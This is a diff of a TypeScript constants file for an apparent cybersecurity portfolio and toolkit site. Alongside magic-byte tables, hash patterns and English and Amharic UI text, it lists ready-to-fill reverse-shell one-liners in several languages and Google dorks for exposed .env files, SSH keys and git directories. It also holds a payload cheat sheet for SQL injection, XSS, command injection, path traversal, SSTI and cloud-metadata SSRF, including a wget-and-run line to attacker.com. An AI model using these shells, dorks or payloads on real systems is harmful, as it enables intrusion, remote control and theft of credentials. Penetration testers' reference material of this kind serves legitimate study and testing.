@@ -1,4 +1,3 @@
-
 import { Language, SocialLink, ServiceItem, Vulnerability, WorkflowStep } from './types';
 import { Github, Twitter, Linkedin, Youtube, ExternalLink, Hash, Shield, Terminal, Globe, Lock, Cpu, Code, Database, Wifi, Flag, Box } from 'lucide-react';
 import React from 'react';
@@ -52,7 +51,6 @@ export const TECH_STACK = [
   "React", "Next.js", "TypeScript", "Python", "Kali Linux", "Node.js", "TailwindCSS", "Firebase", "Docker", "Ethical Hacking"
 ];
 
-// Mock Real-world Vulnerabilities for the Ticker
 export const VULNERABILITIES: Vulnerability[] = [
   {
     id: 'CVE-2024-3094',
@@ -151,33 +149,41 @@ export const WORKFLOW_STEPS: Record<Language, WorkflowStep[]> = {
   ]
 };
 
-export const MAGIC_BYTES = {
+export const MAGIC_BYTES: Record<string, string> = {
   'ffd8ff': 'JPEG Image',
   '89504e47': 'PNG Image',
   '47494638': 'GIF Image',
   '25504446': 'PDF Document',
-  '504b0304': 'ZIP Archive (or DOCX/XLSX)',
+  '504b0304': 'ZIP Archive (DOCX/XLSX/JAR)',
   '1f8b': 'GZIP Archive',
   '424d': 'BMP Image',
   '494433': 'MP3 Audio',
   '7f454c46': 'ELF Executable (Linux)',
-  '4d5a': 'DOS/PE Executable (Windows)'
+  '4d5a': 'DOS/PE Executable (Windows)',
+  '52617221': 'RAR Archive',
+  '000001ba': 'MPEG Video',
+  '377abcaf': '7Z Archive',
+  'fd377a58': 'XZ Archive',
+  '00000018': 'MP4 Video (ftyp)',
+  '23212f62': 'Shebang (Script)',
+  '3c3f786d': 'XML Document',
+  'cafebabe': 'Java Class File'
 };
 
 export const HASH_PATTERNS = [
-  { length: 32, type: 'MD5 / MD4 / MD2' },
-  { length: 40, type: 'SHA-1' },
-  { length: 64, type: 'SHA-256' },
-  { length: 128, type: 'SHA-512' },
+  { length: 32, type: 'MD5 / MD4 / MD2 / NTLM' },
+  { length: 40, type: 'SHA-1 / RIPEMD-160' },
   { length: 56, type: 'SHA-224' },
+  { length: 64, type: 'SHA-256' },
   { length: 96, type: 'SHA-384' },
+  { length: 128, type: 'SHA-512 / Whirlpool' },
 ];
 
 export const SHELL_TEMPLATES = {
   'Bash': 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
   'Python': 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
   'Netcat': 'nc -e /bin/sh {ip} {port}',
-  'Netcat (OpenBSD)': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
+  'Netcat (BSD)': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
   'PHP': 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
   'Perl': 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
 };
@@ -189,24 +195,37 @@ export const GOOGLE_DORKS = {
   'Database Files': 'site:{domain} ext:sql | ext:dbf | ext:mdb',
   'Log Files': 'site:{domain} ext:log',
   'Backup Files': 'site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup',
-  'PHP Errors': 'site:{domain} "PHP Parse error" | "PHP Warning" | "PHP Error"'
+  'PHP Errors': 'site:{domain} "PHP Parse error" | "PHP Warning" | "PHP Error"',
+  'Login Pages': 'site:{domain} inurl:login | inurl:signin | intitle:Login | intitle:Signin',
+  'Exposed Git': 'site:{domain} inurl:.git',
+  'Env Files': 'site:{domain} ext:env | ext:env.production',
+  'WordPress Admins': 'site:{domain} inurl:wp-admin | inurl:wp-login.php',
+  'Stack Traces': 'site:{domain} "Exception in thread" | "at java.lang."',
+  'S3 Buckets': 'site:s3.amazonaws.com "{domain}"',
+  'SSH Keys': 'site:{domain} ext:pem | ext:ppk | ext:key'
 };
 
 export const CHEATSHEET_DATA = [
   {
-    category: "SQL Injection (SQLi)",
+    category: "SQL Injection (SQLi) - Auth Bypass",
     payloads: [
       "' OR '1'='1",
       "' OR 1=1--",
       "' UNION SELECT NULL, username, password FROM users--",
       "admin' --",
-      "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))A)--",
-      "' UNION SELECT 1, @@version, user(), 4 --",
-      "1; DROP TABLE users",
       "' OR '1'='1' /*",
       "admin' #",
       "' OR 1=1 LIMIT 1 -- -",
-      "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
+      "' AND 1=0 UNION ALL SELECT 'admin', 'hash'"
+    ]
+  },
+  {
+    category: "SQL Injection - Union Based",
+    payloads: [
+      "' UNION SELECT 1,2,3--",
+      "' UNION SELECT 1,version(),database()--",
+      "' UNION SELECT NULL, table_name FROM information_schema.tables--",
+      "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--"
     ]
   },
   {
@@ -218,16 +237,14 @@ export const CHEATSHEET_DATA = [
       "javascript:alert(1)",
       "'-alert(1)-'",
       "<body onload=alert('XSS')>",
-      "<iframe src=\"javascript:alert(1)\"></iframe>",
-      "<input onfocus=alert(1) autofocus>",
-      "<select autofocus onfocus=alert(1)>",
-      "<textarea autofocus onfocus=alert(1)>",
-      "<keygen autofocus onfocus=alert(1)>",
-      "<video><source onerror=\"alert(1)\">"
+      "\"><script>alert(document.cookie)</script>",
+      "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+      "\" onfocus=alert(1) autofocus",
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
     ]
   },
   {
-    category: "Remote Code Execution (RCE) / Command Injection",
+    category: "Remote Code Execution (RCE)",
     payloads: [
       "; /bin/sh",
       "| nc -e /bin/sh 10.0.0.1 1234",
@@ -236,9 +253,8 @@ export const CHEATSHEET_DATA = [
       "&& touch /tmp/pwned",
       "; id",
       "| cat /etc/shadow",
-      "& ping -c 10 127.0.0.1 &",
       "; php -r 'echo \"PWNED\";'",
-      "|| wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod 777 /tmp/shell.sh && /tmp/shell.sh"
+      "|| wget http://attacker.com/shell.sh -O /tmp/shell.sh && sh /tmp/shell.sh"
     ]
   },
   {
@@ -251,8 +267,7 @@ export const CHEATSHEET_DATA = [
       "/var/www/html/../../../../etc/shadow",
       "file:///etc/passwd",
       "expect://id",
-      "input://",
-      "http://localhost/index.php?page=http://attacker.com/shell.txt"
+      "/proc/self/environ"
     ]
   },
   {
@@ -273,6 +288,48 @@ export const CHEATSHEET_DATA = [
       "file:///etc/passwd",
       "gopher://127.0.0.1:25/"
     ]
+  },
+  {
+    category: "Template Injection (SSTI)",
+    payloads: [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "#{7*7}",
+      "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
+    ]
+  },
+  {
+    category: "Cloud Metadata (AWS/GCP/Azure)",
+    payloads: [
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/user-data/",
+      "http://169.254.169.254/metadata/v1/instance",
+      "http://metadata.google.internal/computeMetadata/v1/",
+      "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    ]
+  },
+  {
+    category: "JWT Attacks",
+    payloads: [
+      "Change algorithm to 'None'",
+      "Remove signature section",
+      "Brute force HMAC secret",
+      "Change 'alg' to 'HS256' using Public Key",
+      "Inject 'kid' (Key ID) vulnerability"
+    ]
+  },
+  {
+    category: "API Injection",
+    payloads: [
+      "?limit=9999999",
+      "?id=1 OR 1=1",
+      "POST /api/v1/user (Mass Assignment)",
+      "GET /api/v1/users/admin (IDOR)",
+      "Sending XML to JSON endpoint (XXE)",
+      "?debug=true",
+      "HTTP Verb Tampering (HEAD/PUT/DELETE)"
+    ]
   }
 ];
 
@@ -291,7 +348,8 @@ export const PORTS_DATA = [
   { port: 3389, service: 'RDP', desc: 'Remote Desktop' },
   { port: 5432, service: 'PostgreSQL', desc: 'Postgres Database' },
   { port: 6379, service: 'Redis', desc: 'Redis Key-Value' },
-  { port: 8080, service: 'HTTP-Alt', desc: 'Web Proxy / Tomcat' }
+  { port: 8080, service: 'HTTP-Alt', desc: 'Web Proxy / Tomcat' },
+  { port: 27017, service: 'MongoDB', desc: 'NoSQL Database' }
 ];
 
 export const LINUX_COMMANDS = [
@@ -323,152 +381,112 @@ export const GIT_COMMANDS = [
 export const HTTP_STATUS = [
   { code: 200, msg: 'OK', desc: 'Success' },
   { code: 301, msg: 'Moved Permanently', desc: 'Redirect' },
-  { code: 302, msg: 'Found', desc: 'Temp Redirect' },
   { code: 400, msg: 'Bad Request', desc: 'Client Error' },
-  { code: 401, msg: 'Unauthorized', desc: 'Login Required' },
+  { code: 401, msg: 'Unauthorized', desc: 'Auth Required' },
   { code: 403, msg: 'Forbidden', desc: 'Access Denied' },
-  { code: 404, msg: 'Not Found', desc: 'Resource missing' },
+  { code: 404, msg: 'Not Found', desc: 'Resource Missing' },
   { code: 500, msg: 'Internal Server Error', desc: 'Server Crash' },
   { code: 502, msg: 'Bad Gateway', desc: 'Upstream Error' },
   { code: 503, msg: 'Service Unavailable', desc: 'Overloaded' }
 ];
 
+export const DOCKER_SECURITY_RULES = [
+    { pattern: /USER\s+root/i, message: "Avoid running container as root", severity: "Critical" },
+    { pattern: /:latest/i, message: "Avoid using 'latest' tag, pin specific version", severity: "Warning" },
+    { pattern: /ADD\s+http/i, message: "Avoid using ADD for remote URLs, use curl/wget", severity: "Medium" },
+    { pattern: /privileged/i, message: "Avoid running in privileged mode", severity: "Critical" },
+    { pattern: /EXPOSE\s+22/i, message: "Exposing SSH port (22) is not recommended", severity: "High" }
+];
+
+export const FAKE_ID_DATA = {
+    names: ["John Doe", "Jane Smith", "Alice Johnson", "Bob Williams", "Charlie Brown", "David Miller", "Eva Wilson", "Frank Moore", "Grace Taylor", "Henry Anderson"],
+    cities: ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"],
+    domains: ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com"]
+};
+
+export const DREAD_CATEGORIES = [
+    { name: "Damage", desc: "How bad would an attack be?" },
+    { name: "Reproducibility", desc: "How easy is it to reproduce?" },
+    { name: "Exploitability", desc: "How much work is it to launch the attack?" },
+    { name: "Affected Users", desc: "How many people will be impacted?" },
+    { name: "Discoverability", desc: "How easy is it to discover the threat?" }
+];
+
+export const HOMOGRAPH_MAP: Record<string, string> = {
+  'a': 'а', 'c': 'с', 'e': 'е', 'o': 'о', 'p': 'р', 'x': 'х', 'y': 'у', 'A': 'А', 'B': 'В', 'C': 'С', 'E': 'Е', 'H': 'Н', 'I': 'І', 'J': 'Ј', 'K': 'К', 'M': 'М', 'O': 'О', 'P': 'Р', 'T': 'Т', 'X': 'Х', 'Y': 'Ү'
+};
+
+export const MORSE_CODE_MAP: Record<string, string> = {
+  'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
+  'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
+  'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
+  'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
+  'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
+  '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
+  '9': '----.', '0': '-----', ' ': ' / '
+};
+
 export const CONTENT = {
   [Language.EN]: {
     nav: {
-      home: 'Home',
-      services: 'Services',
-      projects: 'Projects',
-      tools: 'Cipher Tools',
-      about: 'About',
-      contact: 'Contact',
+      home: "Home",
+      projects: "Projects",
+      tools: "Tools"
     },
     hero: {
-      title: 'Securing the Digital Frontier',
-      subtitle: 'Advanced cybersecurity solutions, penetration testing, and digital defense strategies designed for the modern web.',
-      ctaPrimary: 'Contact Me',
-      ctaSecondary: 'View Projects',
+      subtitle: "Advanced cybersecurity solutions and digital warfare tools designed for the modern age.",
+      ctaSecondary: "View Projects"
     },
     projects: {
-      title: 'Featured Operations',
-      subtitle: 'A selection of deployed systems and security tools.',
-      visit: 'Visit Site'
+      title: "Projects",
+      subtitle: "A collection of advanced tools and platforms built for security and utility."
     },
     tools: {
-      title: 'Cipher Security Suite',
-      subtitle: 'Advanced cryptographic tools, network analyzers, and forensics utilities.',
-      inputPlaceholder: 'Enter data to process...',
-      tabs: {
-        transform: 'Transform',
-        hash: 'Hashing',
-        security: 'Security',
-        web: 'Web',
-        network: 'Network',
-        forensics: 'Forensics',
-        vault: 'Vault',
-        ctf: 'CTF Toolkit',
-        utils: 'Utils'
-      },
-      labels: {
-        inputFormat: 'Input Format',
-        strength: 'Password Strength',
-        crackTime: 'Est. Crack Time'
-      }
+      title: "Cipher Tools"
     },
     services: {
-      title: 'Operational Workflow',
-      subtitle: 'How we systematically deconstruct and secure your infrastructure.'
-    },
-    ai: {
-      title: 'Cipher AI Assistant',
-      placeholder: 'Ask about cybersecurity...',
-      welcome: 'Hello. I am the Cipher AI. How can I assist with your security needs today?',
+      title: "Operational Workflow",
+      subtitle: "From reconnaissance to reporting, we follow a strict military-grade engagement protocol."
     },
     footer: {
-      rights: 'All rights reserved.',
-      builtBy: 'Built by',
+      rights: "© 2024 CIPHER. All rights reserved.",
+      builtBy: "Architected by"
     },
-    cmd: {
-      placeholder: 'Type a command or search...',
-      actions: 'Actions',
-      navigation: 'Navigation',
+    ai: {
+      title: "Cipher AI",
+      welcome: "Connection established. I am Cipher AI. How may I assist with your security operations today?",
+      placeholder: "Enter command or query..."
     }
   },
   [Language.AM]: {
     nav: {
-      home: 'ዋና ገጽ',
-      services: 'አገልግሎቶች',
-      projects: 'ፕሮጀክቶች',
-      tools: 'ሳይፈር መሳሪያዎች',
-      about: 'ስለ እኛ',
-      contact: 'ያግኙን',
+      home: "መነሻ",
+      projects: "ፕሮጀክቶች",
+      tools: "መሳሪያዎች"
     },
     hero: {
-      title: 'የዲጂታል ድንበርን መጠበቅ',
-      subtitle: 'ለዘመናዊው ድር የተነደፉ የላቀ የሳይበር ደህንነት መፍትሄዎች፣ የጥቃት ሙከራዎች እና የዲጂታል መከላከያ ስልቶች።',
-      ctaPrimary: 'አግኙን',
-      ctaSecondary: 'ፕሮጀክቶችን ይመልከቱ',
+      subtitle: "ለዘመናዊው ዓለም የተነደፉ የሳይበር ደህንነት መፍትሄዎች እና የዲጂታል ጦርነት መሳሪያዎች።",
+      ctaSecondary: "ፕሮጀክቶችን ይመልከቱ"
     },
     projects: {
-      title: 'የተመረጡ ስራዎች',
-      subtitle: 'በቅርቡ የተሰሩ ስርዓቶች እና የደህንነት መሳሪያዎች።',
-      visit: 'ድረ-ገጹን ይጎብኙ'
+      title: "ፕሮጀክቶች",
+      subtitle: "ለደህንነት እና ለአገልግሎት የተገነቡ የላቁ መሳሪያዎች እና መድረኮች ስብስብ።"
     },
     tools: {
-      title: 'የሳይፈር ደህንነት ስብስብ',
-      subtitle: 'የላቀ የምስጠራ መሳሪያዎች፣ የኔትወርክ መመርመሪያዎች እና የፎረንሲክ መሳሪያዎች።',
-      inputPlaceholder: 'ለማስኬድ ውሂብ ያስገቡ...',
-      tabs: {
-        transform: 'ልወጣ',
-        hash: 'ሃሽ',
-        security: 'ደህንነት',
-        web: 'ዌብ',
-        network: 'ኔትወርክ',
-        forensics: 'ፎረንሲክ',
-        vault: 'ካዝና',
-        ctf: 'CTF መርጃ',
-        utils: 'መገልገያዎች'
-      },
-      labels: {
-        inputFormat: 'የግቤት አይነት',
-        strength: 'የይለፍ ቃል ጥንካሬ',
-        crackTime: 'የመገመቻ ጊዜ'
-      }
+      title: "የሳይፈር መሳሪያዎች"
     },
     services: {
-      title: 'የስራ ሂደት',
-      subtitle: 'የደህንነት ክፍተቶችን እንዴት በስርዓት እንደምንለይ እና እንደምንጠግን።'
-    },
-    ai: {
-      title: 'ሳይፈር AI ረዳት',
-      placeholder: 'ስለ ሳይበር ደህንነት ይጠይቁ...',
-      welcome: 'ሰላም። እኔ የሳይፈር AI ነኝ። ዛሬ በደህንነት ፍላጎቶችዎ እንዴት ልርዳዎት?',
+      title: "የአሠራር ሂደት",
+      subtitle: "ከቅድመ-ጥናት እስከ ሪፖርት አቀራረብ፣ ጥብቅ ወታደራዊ ደረጃ ያለው የውል ስምምነት ፕሮቶኮልን እንከተላለን።"
     },
     footer: {
-      rights: 'መብቱ በህግ የተጠበቀ ነው።',
-      builtBy: 'በ ብሩክ ጌታቸው የተሰራ',
+      rights: "© 2024 ሳይፈር። መብቱ በህግ የተጠበቀ ነው።",
+      builtBy: "የተገነባው በ"
     },
-    cmd: {
-      placeholder: 'ትዕዛዝ ያስገቡ...',
-      actions: 'ተግባራት',
-      navigation: 'መዳረሻዎች',
+    ai: {
+      title: "ሳይፈር AI",
+      welcome: "ግኑኝነት ተፈጥሯል። እኔ ሳይፈር AI ነኝ። በደህንነት ስራዎ ዛሬ እንዴት ልርዳዎት?",
+      placeholder: "ትእዛዝ ወይም ጥያቄ ያስገቡ..."
     }
   }
-};
-
-export const ICONS_MAP: Record<string, React.FC<any>> = {
-  github: Github,
-  twitter: Twitter,
-  linkedin: Linkedin,
-  youtube: Youtube,
-  pin: Hash, 
-  send: ExternalLink, 
-  shield: Shield,
-  terminal: Terminal,
-  globe: Globe,
-  lock: Lock,
-  cpu: Cpu,
-  code: Code,
-  database: Database,
-  wifi: Wifi
 };
